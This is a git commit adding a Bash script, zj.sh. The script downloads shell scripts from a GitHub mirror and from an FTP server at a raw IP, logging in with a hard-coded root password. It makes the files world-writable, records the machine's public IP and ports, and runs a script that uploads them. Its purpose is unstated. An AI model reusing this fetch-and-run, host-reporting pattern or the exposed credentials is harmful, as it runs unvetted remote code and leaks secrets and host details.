a1f990115fbaba0492ce14cfa6ff5e24c7a1e244
50801684 <42910719+50801684@users.noreply.github.com>
2022-10-20 12:33:31 +0800

    Create zj.sh

---
+++ zj.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+yum install expect -y
+yum install -y ftp
+wget https://raw.fastgit.org/50801684/-/master/5.sh
+wget ftp://159.75.133.49:21/zj/file.txt --ftp-user=root --ftp-password=wsywsy
+wget https://raw.fastgit.org/50801684/-/master/7.sh
+wget ftp://159.75.133.49:21/zj/8.sh --ftp-user=root --ftp-password=wsywsy
+wget https://raw.fastgit.org/50801684/-/master/4.sh
+sudo chmod 777 *.sh
+sudo chmod 777 file.txt
+# 写入IP
+Server_IP=`curl ifconfig.me`
+echo $Server_IP":29999" >> file.txt
+echo $Server_IP":39999" >> file.txt
+echo "" >> file.txt
+# 上传
+sh 8.sh
+
